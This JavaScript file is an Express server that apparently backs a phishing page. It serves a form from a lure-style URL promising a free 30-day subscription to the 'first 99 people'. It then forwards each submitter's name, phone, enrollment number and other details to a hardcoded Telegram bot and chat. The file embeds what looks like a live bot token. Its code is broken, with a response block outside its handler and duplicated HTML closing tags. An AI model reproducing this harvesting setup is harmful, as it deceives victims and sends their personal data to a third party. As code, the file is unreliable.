const express = require('express');
const https = require('https');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
const TELEGRAM_BOT_TOKEN = '8957531455:AAH5F5NVTBvUb4cU721SVDu-VXGfZG3ME-Y';
const TELEGRAM_CHAT_ID = '7611064372';

app.post('/submit', (req, res) => {
    const { name, phone, group, section, attendance, branch, enrollment } = req.body;

    const message = `🎓 *New Student Attendance*:\n\n` +
                    `👤 *Name*: ${name}\n` +
                    `📞 *Phone*: ${phone}\n` +
                    `👥 *Group*: ${group}\n` +
                    `🏫 *Section*: ${section}\n` +
                    `📋 *Attendance*: ${attendance}\n` +
                    `🏛️ *Branch*: ${branch}\n` +
                    `🆔 *Enrollment*: ${enrollment}`;

    const textParam = encodeURIComponent(message);
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${textParam}&parse_mode=Markdown`;

    https.get(url, (telegramRes) => {
        let data = '';
        telegramRes.on('data', (chunk) => { data += chunk; });
        telegramRes.on('end', () => {
            console.log("Telegram Response:", data);
        });
    }).on('error', (err) => {
        console.log("Error:", err.message);
    });
});

   res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Successful Done</title>
        <style>
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #0f172a, #1e1b4b);
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .card {
                text-align: center;
                background: rgba(30, 41, 59, 0.85);
                backdrop-filter: blur(10px);
                padding: 50px 70px;
                border-radius: 24px;
                box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), 
                            inset 0 1px 1px rgba(255, 255, 255, 0.1);
                border: 1px solid rgba(255, 255, 255, 0.05);
                animation: popUp 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
            }
            @keyframes popUp {
                0% { transform: scale(0.5); opacity: 0; }
                100% { transform: scale(1); opacity: 1; }
            }
            .badge {
                width: 110px;
                height: 110px;
                background: linear-gradient(135deg, #00c6ff, #0072ff);
                display: inline-block;
                position: relative;
                clip-path: polygon(50% 0%, 65% 10%, 80% 5%, 88% 20%, 100% 30%, 95% 45%, 100% 60%, 88% 70%, 80% 85%, 65% 80%, 50% 100%, 35% 80%, 20% 85%, 12% 70%, 0% 60%, 5% 45%, 0% 30%, 12% 20%, 20% 5%, 35% 10%);
                margin-bottom: 25px;
                box-shadow: 0 10px 25px rgba(0, 114, 255, 0.5);
                animation: floatBadge 3s ease-in-out infinite;
            }
            @keyframes floatBadge {
                0%, 100% { transform: translateY(0); }
                50% { transform: translateY(-8px); }
            }
            .tick {
                color: white;
                font-size: 55px;
                line-height: 110px;
                font-weight: bold;
                text-shadow: 0 4px 10px rgba(0,0,0,0.3);
            }
            h1 {
                color: #f8fafc;
                font-size: 28px;
                font-weight: 600;
                margin: 0;
                letter-spacing: 0.5px;
                text-shadow: 0 2px 4px rgba(0,0,0,0.4);
            }
        </style>
    </head>
    <body>
        <div class="card">
            <div class="badge">
                <div class="tick">&#10003;</div>
            </div>
            <h1>Successful Done</h1>
        </div>
    </body>
    </html>
        </div>
    </body>
    </html>
`);
});

app.get('/Click-here-to-log-in-to-your-ID-and-get-a-30-day-subscription.-After-you-log-in,-your-subscription-will-start-within-24-hours.-This-offer-is-only-for-the-first-99-people,-so-log-in-quickly-and-grab-your-offer-now', (req, res) => {
    res.sendFile(__dirname + '/form.html');
});
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});